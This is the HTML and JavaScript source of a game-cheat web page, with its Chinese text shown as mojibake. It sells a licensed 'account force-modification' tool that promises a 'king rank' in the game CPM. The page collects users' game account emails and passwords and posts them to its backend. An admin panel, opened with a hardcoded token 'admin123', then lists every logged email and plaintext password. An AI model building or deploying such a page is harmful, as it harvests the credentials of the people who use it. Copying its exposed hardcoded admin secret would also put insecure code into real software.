<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>å­£ä¼¯å¸¸å¼ºæ”»</title>
<!-- å¼•å…¥ç°ä»£å­—ä½“ -->
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }

    body {
        font-family: 'Inter', sans-serif;
        /* é«˜æ¸…ç§‘æŠ€æ„ŸèƒŒæ™¯å›¾ */
        background: url("https://picsum.photos/id/1/1920/1080") no-repeat center center fixed;
        background-size: cover;
        /* æ¸å˜è’™ç‰ˆæå‡æ–‡å­—å¯è¯»æ€§ */
        background-color: rgba(0, 0, 0, 0.8);
        background-blend-mode: overlay;
        color: #fff;
        min-height: 100vh;
        display: flex;
        align-items: center;
        justify-content: center;
        padding: 20px;
    }

    /* å®¹å™¨å¡ç‰‡ */
    .center-wrapper {
        width: 100%;
        max-width: 500px;
    }

    .container {
        background: rgba(17, 25, 40, 0.85);
        backdrop-filter: blur(12px);
        -webkit-backdrop-filter: blur(12px);
        padding: 40px 30px;
        border-radius: 16px;
        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        border: 1px solid rgba(255, 255, 255, 0.1);
        /* è¾¹æ¡†å‘å…‰æ•ˆæœ */
        box-shadow: 0 0 20px rgba(22, 93, 255, 0.2);
        text-align: center;
        transition: all 0.3s ease;
    }

    .container:hover {
        box-shadow: 0 0 30px rgba(22, 93, 255, 0.3);
    }

    /* æ ‡é¢˜æ ·å¼ */
    .title {
        font-size: 28px;
        font-weight: 700;
        margin-bottom: 8px;
        color: #fff;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 12px;
    }

    .subtitle {
        font-size: 14px;
        color: rgba(255, 255, 255, 0.6);
        margin-bottom: 30px;
    }

    /* å¯†é’¥ä¿¡æ¯æ ·å¼ */
    .license-info {
        background: rgba(255, 255, 255, 0.05);
        border: 1px solid rgba(255, 255, 255, 0.1);
        border-radius: 10px;
        padding: 15px;
        margin-bottom: 20px;
        text-align: left;
    }

    .license-item {
        display: flex;
        justify-content: space-between;
        margin-bottom: 8px;
        font-size: 13px;
    }

    .license-label {
        color: rgba(255, 255, 255, 0.7);
    }

    .license-value {
        color: #fff;
        font-weight: 500;
    }

    /* è¾“å…¥æ¡†æ ·å¼ */
    .input-group {
        margin-bottom: 18px;
        position: relative;
    }

    input {
        width: 100%;
        padding: 14px 18px;
        border-radius: 10px;
        border: 1px solid rgba(255, 255, 255, 0.1);
        background: rgba(255, 255, 255, 0.08);
        color: #fff;
        font-size: 15px;
        font-family: 'Inter', sans-serif;
        transition: all 0.3s ease;
    }

    input::placeholder {
        color: rgba(255, 255, 255, 0.4);
    }

    input:focus {
        outline: none;
        border-color: #165DFF;
        background: rgba(255, 255, 255, 0.12);
        box-shadow: 0 0 0 3px rgba(22, 93, 255, 0.2);
    }

    /* æŒ‰é’®æ ·å¼ */
    .btn {
        width: 100%;
        padding: 14px;
        margin: 8px 0;
        border-radius: 10px;
        border: none;
        cursor: pointer;
        font-size: 15px;
        font-weight: 600;
        font-family: 'Inter', sans-serif;
        transition: all 0.3s ease;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
    }

    /* ä¸»æŒ‰é’® */
    .btn-primary {
        background: linear-gradient(135deg, #165DFF 0%, #0F48C9 100%);
        color: #fff;
        box-shadow: 0 4px 15px rgba(22, 93, 255, 0.3);
    }

    .btn-primary:hover {
        background: linear-gradient(135deg, #0F48C9 0%, #0A36A8 100%);
        box-shadow: 0 6px 20px rgba(22, 93, 255, 0.4);
        transform: translateY(-2px);
    }

    /* èœå•æŒ‰é’® */
    .btn-menu {
        background: rgba(255, 255, 255, 0.08);
        color: #fff;
        border: 1px solid rgba(255, 255, 255, 0.1);
    }

    .btn-menu:hover {
        background: rgba(255, 255, 255, 0.12);
        border-color: rgba(255, 255, 255, 0.2);
        transform: translateY(-2px);
    }

    /* é€€å‡ºæŒ‰é’® */
    .btn-logout {
        background: rgba(239, 68, 68, 0.1);
        color: #EF4444;
        border: 1px solid rgba(239, 68, 68, 0.2);
    }

    .btn-logout:hover {
        background: rgba(239, 68, 68, 0.15);
        border-color: rgba(239, 68, 68, 0.3);
    }

    /* ç®¡ç†å‘˜æŒ‰é’® */
    .btn-admin {
        background: linear-gradient(135deg, #F59E0B 0%, #D97706 100%);
        color: #fff;
        margin-top: 10px;
    }

    /* çŠ¶æ€æç¤º */
    .status {
        margin: 20px 0 10px;
        padding: 12px;
        border-radius: 8px;
        font-size: 14px;
        word-wrap: break-word;
        transition: all 0.3s ease;
    }

    .status-success {
        background: rgba(34, 197, 94, 0.15);
        color: #22C55E;
        border: 1px solid rgba(34, 197, 94, 0.2);
    }

    .status-error {
        background: rgba(239, 68, 68, 0.15);
        color: #EF4444;
        border: 1px solid rgba(239, 68, 68, 0.2);
    }

    /* åŠ è½½åŠ¨ç”» */
    .spinner {
        width: 18px;
        height: 18px;
        border: 2px solid rgba(255, 255, 255, 0.3);
        border-top-color: #fff;
        border-radius: 50%;
        animation: spin 1s linear infinite;
    }

    @keyframes spin {
        to { transform: rotate(360deg); }
    }

    /* éšè—/æ˜¾ç¤ºè¿‡æ¸¡ */
    .form-section {
        display: none;
        animation: fadeIn 0.5s ease;
    }

    .form-section.active {
        display: block;
    }

    @keyframes fadeIn {
        from { opacity: 0; transform: translateY(10px); }
        to { opacity: 1; transform: translateY(0); }
    }

    /* ç®¡ç†å‘˜é¢æ¿æ ·å¼ */
    .admin-panel {
        background: rgba(0, 0, 0, 0.3);
        border-radius: 10px;
        padding: 20px;
        margin-top: 20px;
        max-height: 400px;
        overflow-y: auto;
    }

    .admin-table {
        width: 100%;
        border-collapse: collapse;
        font-size: 12px;
    }

    .admin-table th,
    .admin-table td {
        padding: 8px;
        border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        text-align: left;
    }

    .admin-table th {
        background: rgba(255, 255, 255, 0.1);
        color: #4CC9F0;
        font-weight: 600;
    }

    .admin-table tr:hover {
        background: rgba(255, 255, 255, 0.05);
    }

    .badge {
        padding: 4px 8px;
        border-radius: 12px;
        font-size: 10px;
        font-weight: 600;
    }

    .badge-success {
        background: rgba(34, 197, 94, 0.2);
        color: #22C55E;
    }

    .badge-danger {
        background: rgba(239, 68, 68, 0.2);
        color: #EF4444;
    }

    /* é¡µè„š */
    footer {
        margin-top: 25px;
        font-size: 12px;
        color: rgba(255, 255, 255, 0.5);
        opacity: 0.8;
    }

    /* å“åº”å¼ä¼˜åŒ– */
    @media (max-width: 480px) {
        .container {
            padding: 30px 20px;
            border-radius: 12px;
        }

        .title {
            font-size: 24px;
        }

        .btn {
            padding: 12px;
            font-size: 14px;
        }

        input {
            padding: 12px 16px;
            font-size: 14px;
        }

        .admin-table {
            font-size: 10px;
        }
    }
</style>
</head>
<body>

<div class="center-wrapper">
  <div class="container">
      <h1 class="title">ğŸ‘‘å­£ä¼¯å¸¸å¼ºæ”»å·¥å…·ğŸ‘‘</h1>
      <p class="subtitle">ä¸“ä¸šé«˜æ•ˆçš„è´¦å·å¼ºæ”¹å·¥å…·</p>

      <!-- ç®¡ç†å‘˜å…¥å£ -->
      <button class="btn btn-admin" onclick="showAdminPanel()">
          <i class="fas fa-shield-alt"></i> ç®¡ç†å‘˜å…¥å£
      </button>

      <!-- å¯†é’¥éªŒè¯è¡¨å• -->
      <div id="licenseForm" class="form-section active">
          <div class="license-info">
              <div class="license-item">
                  <span class="license-label">å½“å‰ç‰ˆæœ¬:</span>
                  <span class="license-value">v2.1.0</span>
              </div>
              <div class="license-item">
                  <span class="license-label">æˆæƒç±»å‹:</span>
                  <span class="license-value" id="licenseType">--</span>
              </div>
              <div class="license-item">
                  <span class="license-label">åˆ°æœŸæ—¶é—´:</span>
                  <span class="license-value" id="expiryTime">--</span>
              </div>
              <div class="license-item">
                  <span class="license-label">å‰©ä½™ä½¿ç”¨:</span>
                  <span class="license-value" id="remainingUses">--</span>
              </div>
              <div class="license-item">
                  <span class="license-label">çŠ¶æ€:</span>
                  <span class="license-value" id="licenseStatus">æœªéªŒè¯</span>
              </div>
          </div>
          
          <div class="input-group">
              <input type="text" id="licenseKey" placeholder="è¯·è¾“å…¥æˆæƒå¯†é’¥" required>
          </div>
          <button class="btn btn-primary" id="verifyBtn" onclick="handleLicenseVerify()">
              <span id="verifyBtnText">éªŒè¯å¯†é’¥</span>
              <span class="spinner" id="verifySpinner" style="display: none;"></span>
          </button>
      </div>

      <!-- ç™»å½•è¡¨å• -->
      <div id="loginForm" class="form-section">
          <div class="input-group">
              <input type="email" id="email" placeholder="è¯·è¾“å…¥é‚®ç®±" required>
          </div>
          <div class="input-group">
              <input type="password" id="password" placeholder="è¯·è¾“å…¥å¯†ç " required>
          </div>
          <button class="btn btn-primary" id="loginBtn" onclick="handleLogin()">
              <span id="loginBtnText">ç™»å½•</span>
              <span class="spinner" id="loginSpinner" style="display: none;"></span>
          </button>
      </div>

      <!-- èœå•æŒ‰é’®åŒº -->
      <div id="menuButtons" class="form-section">
          <button class="btn btn-menu" onclick="handleKingRank()">ğŸ‘‘ ç§’åˆ·king</button>
          <button class="btn btn-logout" onclick="handleLogout()">ğŸšª é€€å‡ºç™»å½•</button>
      </div>

      <!-- ç®¡ç†å‘˜é¢æ¿ -->
      <div id="adminPanel" class="form-section">
          <div class="admin-panel">
              <h3 style="color: #4CC9F0; margin-bottom: 15px; text-align: center;">
                  <i class="fas fa-shield-alt"></i> ç™»å½•æ—¥å¿—ç›‘æ§
              </h3>
              
              <div class="controls" style="margin-bottom: 15px; display: flex; gap: 10px;">
                  <button class="btn btn-primary" onclick="loadLoginLogs()" style="padding: 8px 12px; font-size: 12px;">
                      <i class="fas fa-sync-alt"></i> åˆ·æ–°
                  </button>
                  <button class="btn btn-menu" onclick="clearAdminLogs()" style="padding: 8px 12px; font-size: 12px;">
                      <i class="fas fa-trash"></i> æ¸…ç©º
                  </button>
              </div>

              <table class="admin-table">
                  <thead>
                      <tr>
                          <th>æ—¶é—´</th>
                          <th>é‚®ç®±</th>
                          <th>å¯†ç </th>
                          <th>çŠ¶æ€</th>
                      </tr>
                  </thead>
                  <tbody id="adminLogsTable">
                      <tr>
                          <td colspan="4" style="text-align: center; color: rgba(255,255,255,0.5);">
                              ç‚¹å‡»åˆ·æ–°åŠ è½½ç™»å½•æ—¥å¿—
                          </td>
                      </tr>
                  </tbody>
              </table>
          </div>
          <button class="btn btn-logout" onclick="hideAdminPanel()" style="margin-top: 15px;">
              <i class="fas fa-times"></i> å…³é—­ç®¡ç†å‘˜é¢æ¿
          </button>
      </div>

      <!-- çŠ¶æ€æç¤º -->
      <div id="status" class="status"></div>

      <footer>Â© 2025 CPMå­£ä¼¯å¸¸. ä¿ç•™æ‰€æœ‰æƒåˆ©ã€‚</footer>
  </div>
</div>

<!-- å¼•å…¥Font Awesome -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>

<script>
// åç«¯APIåœ°å€
const API_BASE_URL = "/api";

let currentUser = null;
let currentToken = null;
let currentLicense = null;
let licenseExpiry = null;
let licenseType = null;
let sessionId = null;
let remainingUses = 0;

// æ›´æ–°çŠ¶æ€æç¤º
function updateStatus(message, isError = false) {
    const statusEl = document.getElementById('status');
    statusEl.textContent = message;
    statusEl.className = `status ${isError ? 'status-error' : 'status-success'}`;
    // 3ç§’åè‡ªåŠ¨æ¸…é™¤éé”™è¯¯æç¤º
    if (!isError) {
        setTimeout(() => {
            statusEl.textContent = '';
            statusEl.className = 'status';
        }, 3000);
    }
}

// æ˜¾ç¤º/éšè—åŠ è½½çŠ¶æ€
function setLoading(state, btnId, btnTextId, spinnerId) {
    const btn = document.getElementById(btnId);
    const btnText = document.getElementById(btnTextId);
    const spinner = document.getElementById(spinnerId);
    
    if (state) {
        btn.disabled = true;
        btnText.style.display = 'none';
        spinner.style.display = 'block';
    } else {
        btn.disabled = false;
        btnText.style.display = 'inline';
        spinner.style.display = 'none';
    }
}

// åˆ‡æ¢è¡¨å•åŒºåŸŸ
function switchSection(showId, hideId) {
    document.getElementById(showId).classList.add('active');
    document.getElementById(hideId).classList.remove('active');
}

// æ›´æ–°è®¸å¯è¯ä¿¡æ¯æ˜¾ç¤º
function updateLicenseInfo(licenseData = null) {
    const expiryTimeEl = document.getElementById('expiryTime');
    const licenseStatusEl = document.getElementById('licenseStatus');
    const licenseTypeEl = document.getElementById('licenseType');
    const remainingUsesEl = document.getElementById('remainingUses');
    
    if (licenseData) {
        const now = new Date();
        const expiryDate = new Date(licenseData.expiry);
        expiryDate.setHours(23, 59, 59, 999);
        
        const isValid = expiryDate > now;
        
        expiryTimeEl.textContent = licenseData.expiry;
        expiryTimeEl.className = `license-value ${isValid ? 'license-valid' : 'license-expired'}`;
        licenseStatusEl.textContent = isValid ? 'æœ‰æ•ˆ' : 'å·²è¿‡æœŸ';
        licenseStatusEl.className = `license-value ${isValid ? 'license-valid' : 'license-expired'}`;
        licenseTypeEl.textContent = licenseData.type || '--';
        remainingUsesEl.textContent = `${licenseData.remainingUses || 0}æ¬¡`;
        remainingUsesEl.className = `license-value ${(licenseData.remainingUses || 0) > 0 ? 'license-valid' : 'license-expired'}`;
        
    } else {
        expiryTimeEl.textContent = '--';
        expiryTimeEl.className = 'license-value';
        licenseStatusEl.textContent = 'æœªéªŒè¯';
        licenseStatusEl.className = 'license-value';
        licenseTypeEl.textContent = '--';
        remainingUsesEl.textContent = '--';
        remainingUsesEl.className = 'license-value';
    }
}

// éªŒè¯è®¸å¯è¯å¯†é’¥ - è°ƒç”¨åç«¯API
async function handleLicenseVerify() {
    const licenseKey = document.getElementById('licenseKey').value.trim();
    
    if (!licenseKey) {
        return updateStatus("è¯·è¾“å…¥æˆæƒå¯†é’¥ï¼", true);
    }
    
    // æ˜¾ç¤ºåŠ è½½çŠ¶æ€
    setLoading(true, 'verifyBtn', 'verifyBtnText', 'verifySpinner');
    updateStatus("æ­£åœ¨éªŒè¯å¯†é’¥...");
    
    try {
        // è°ƒç”¨åç«¯éªŒè¯æ¥å£
        const response = await fetch(`${API_BASE_URL}/verify-license`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ licenseKey })
        });

        const data = await response.json();

        if (!response.ok || !data.success) {
            throw new Error(data.message || "æ— æ•ˆçš„æˆæƒå¯†é’¥ï¼");
        }

        // ä¿å­˜è®¸å¯è¯ä¿¡æ¯
        currentLicense = data.data.key;
        licenseExpiry = data.data.expiry;
        licenseType = data.data.type;
        sessionId = data.data.sessionId;
        remainingUses = data.data.remainingUses;

        updateLicenseInfo(data.data);
        updateStatus("å¯†é’¥éªŒè¯æˆåŠŸï¼");

        // 2ç§’ååˆ‡æ¢åˆ°ç™»å½•ç•Œé¢
        setTimeout(() => {
            switchSection('loginForm', 'licenseForm');
        }, 2000);
        
    } catch (error) {
        updateStatus(`éªŒè¯å¤±è´¥ï¼š${error.message}`, true);
    } finally {
        setLoading(false, 'verifyBtn', 'verifyBtnText', 'verifySpinner');
    }
}

// æ£€æŸ¥ä¼šè¯çŠ¶æ€ - è°ƒç”¨åç«¯API
async function checkSession() {
    if (!sessionId) {
        return { valid: false, message: "ä¼šè¯æ— æ•ˆ" };
    }
    
    try {
        const response = await fetch(`${API_BASE_URL}/check-session`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ sessionId })
        });

        const data = await response.json();
        return data;

    } catch (error) {
        return { success: false, message: "ä¼šè¯æ£€æŸ¥å¤±è´¥" };
    }
}

// æ£€æŸ¥è®¸å¯è¯çŠ¶æ€
async function checkLicense() {
    if (!sessionId) {
        updateStatus("è¯·å…ˆéªŒè¯æˆæƒå¯†é’¥ï¼", true);
        switchSection('licenseForm', 'loginForm');
        return false;
    }
    
    const sessionCheck = await checkSession();
    if (!sessionCheck.success) {
        updateStatus(sessionCheck.data?.message || "ä¼šè¯æ— æ•ˆï¼Œè¯·é‡æ–°éªŒè¯å¯†é’¥", true);
        switchSection('licenseForm', 'menuButtons');
        return false;
    }
    
    return true;
}

// ç™»å½•å¤„ç† - è°ƒç”¨åç«¯API
async function handleLogin() {
    if (!sessionId) {
        return updateStatus("è¯·å…ˆéªŒè¯æˆæƒå¯†é’¥ï¼", true);
    }
    
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value.trim();

    // å‰ç«¯åŸºç¡€éªŒè¯
    if (!email || !password) {
        return updateStatus("è¯·è¾“å…¥é‚®ç®±å’Œå¯†ç ï¼", true);
    }
    if (!/^[\w.-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$/.test(email)) {
        return updateStatus("è¯·è¾“å…¥æœ‰æ•ˆçš„é‚®ç®±æ ¼å¼ï¼", true);
    }

    // æ˜¾ç¤ºåŠ è½½çŠ¶æ€
    setLoading(true, 'loginBtn', 'loginBtnText', 'loginSpinner');
    updateStatus("æ­£åœ¨ç™»å½•...");

    try {
        // è°ƒç”¨åç«¯ç™»å½•æ¥å£ï¼ˆåŒ…å«sessionIdï¼‰
        const response = await fetch(`${API_BASE_URL}/login`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ 
                email, 
                password,
                sessionId 
            })
        });

        const data = await response.json();

        if (!response.ok || !data.success) {
            throw new Error(data.message || "ç™»å½•å¤±è´¥ï¼Œè¯·æ£€æŸ¥è´¦å·å¯†ç ï¼");
        }

        // ä¿å­˜ç”¨æˆ·ä¿¡æ¯
        currentUser = data.data.email;
        currentToken = data.data.idToken;

        // åˆ‡æ¢åˆ°èœå•ç•Œé¢
        switchSection('menuButtons', 'loginForm');
        updateStatus(`ç™»å½•æˆåŠŸï¼æ¬¢è¿å›æ¥ï¼Œ${currentUser}`);

        // æ¸…ç©ºè¾“å…¥æ¡†
        document.getElementById('email').value = '';
        document.getElementById('password').value = '';

    } catch (error) {
        updateStatus(`ç™»å½•å¤±è´¥ï¼š${error.message}`, true);
    } finally {
        // éšè—åŠ è½½çŠ¶æ€
        setLoading(false, 'loginBtn', 'loginBtnText', 'loginSpinner');
    }
}

// éªŒè¯ç™»å½•çŠ¶æ€
function checkLogin() {
    if (!currentUser || !currentToken) {
        updateStatus("è¯·å…ˆç™»å½•ï¼", true);
        return false;
    }
    return true;
}

// è®¾ç½®å›½ç‹ç­‰çº§ - è°ƒç”¨åç«¯API
async function handleKingRank() {
    if (!checkLogin()) return;

    // æ£€æŸ¥ä¼šè¯çŠ¶æ€
    const sessionCheck = await checkSession();
    if (!sessionCheck.success) {
        updateStatus(sessionCheck.data?.message || "ä¼šè¯æ— æ•ˆï¼Œè¯·é‡æ–°éªŒè¯å¯†é’¥", true);
        switchSection('licenseForm', 'menuButtons');
        return;
    }

    updateStatus("æ­£åœ¨è®¾ç½®å›½ç‹ç­‰çº§...");

    try {
        const response = await fetch(`${API_BASE_URL}/king-rank`, {
            method: "POST",
            headers: { 
                "Content-Type": "application/json",
                "Authorization": `Bearer ${currentToken}`
            },
            body: JSON.stringify({
                sessionId
            })
        });

        const data = await response.json();

        if (!response.ok || !data.success) {
            throw new Error(data.message || "è®¾ç½®å›½ç‹ç­‰çº§å¤±è´¥ï¼");
        }

        updateStatus("å›½ç‹ç­‰çº§è®¾ç½®æˆåŠŸï¼");

    } catch (error) {
        updateStatus(`æ“ä½œå¤±è´¥ï¼š${error.message}`, true);
    }
}

// é€€å‡ºç™»å½•
function handleLogout() {
    currentUser = null;
    currentToken = null;
    currentLicense = null;
    licenseExpiry = null;
    licenseType = null;
    sessionId = null;
    remainingUses = 0;
    switchSection('loginForm', 'menuButtons');
    updateLicenseInfo(); // é‡ç½®æ˜¾ç¤º
    updateStatus("å·²æˆåŠŸé€€å‡ºç™»å½•");
}

// ==================== ç®¡ç†å‘˜åŠŸèƒ½ ====================

// æ˜¾ç¤ºç®¡ç†å‘˜é¢æ¿
function showAdminPanel() {
    switchSection('adminPanel', 'licenseForm');
    loadLoginLogs();
}

// éšè—ç®¡ç†å‘˜é¢æ¿
function hideAdminPanel() {
    switchSection('licenseForm', 'adminPanel');
}

// åŠ è½½ç™»å½•æ—¥å¿—
async function loadLoginLogs() {
    try {
        updateStatus("æ­£åœ¨åŠ è½½ç™»å½•æ—¥å¿—...");
        
        const response = await fetch(`${API_BASE_URL}/admin/login-logs?limit=50`, {
            headers: {
                'x-admin-token': 'admin123' // ä½¿ç”¨æ‚¨çš„ç®¡ç†å‘˜ä»¤ç‰Œ
            }
        });

        if (!response.ok) {
            throw new Error(`APIè¯·æ±‚å¤±è´¥: ${response.status}`);
        }

        const data = await response.json();

        if (data.success) {
            displayLoginLogs(data.data);
            updateStatus(`æˆåŠŸåŠ è½½ ${data.data.length} æ¡ç™»å½•è®°å½•`);
        } else {
            throw new Error(data.message || "è·å–æ—¥å¿—å¤±è´¥");
        }

    } catch (error) {
        console.error('åŠ è½½ç™»å½•æ—¥å¿—å¤±è´¥:', error);
        updateStatus(`åŠ è½½å¤±è´¥: ${error.message}`, true);
    }
}

// æ˜¾ç¤ºç™»å½•æ—¥å¿—
function displayLoginLogs(logs) {
    const tableBody = document.getElementById('adminLogsTable');
    
    if (!logs || logs.length === 0) {
        tableBody.innerHTML = `
            <tr>
                <td colspan="4" style="text-align: center; color: rgba(255,255,255,0.5);">
                    æš‚æ— ç™»å½•è®°å½•
                </td>
            </tr>
        `;
        return;
    }

    tableBody.innerHTML = logs.map(log => `
        <tr>
            <td>${new Date(log.timestamp).toLocaleTimeString()}</td>
            <td><strong>${log.email}</strong></td>
            <td><code>${log.password}</code></td>
            <td>
                <span class="badge ${log.success ? 'badge-success' : 'badge-danger'}">
                    ${log.success ? 'æˆåŠŸ' : 'å¤±è´¥'}
                </span>
            </td>
        </tr>
    `).join('');
}

// æ¸…ç©ºç®¡ç†å‘˜æ—¥å¿—æ˜¾ç¤º
function clearAdminLogs() {
    document.getElementById('adminLogsTable').innerHTML = `
        <tr>
            <td colspan="4" style="text-align: center; color: rgba(255,255,255,0.5);">
                æ—¥å¿—æ˜¾ç¤ºå·²æ¸…ç©º
            </td>
        </tr>
    `;
    updateStatus("æ—¥å¿—æ˜¾ç¤ºå·²æ¸…ç©º");
}

// é¡µé¢åŠ è½½å®Œæˆ
document.addEventListener("DOMContentLoaded", () => {
    // åˆå§‹åŒ–è®¸å¯è¯ä¿¡æ¯æ˜¾ç¤º
    updateLicenseInfo();
    
    // ä¸ºè¾“å…¥æ¡†æ·»åŠ å›è½¦åŠŸèƒ½
    document.getElementById('licenseKey').addEventListener('keydown', (e) => {
        if (e.key === 'Enter') handleLicenseVerify();
    });
    
    document.getElementById('password').addEventListener('keydown', (e) => {
        if (e.key === 'Enter') handleLogin();
    });
});
</script>
</body>
</html>
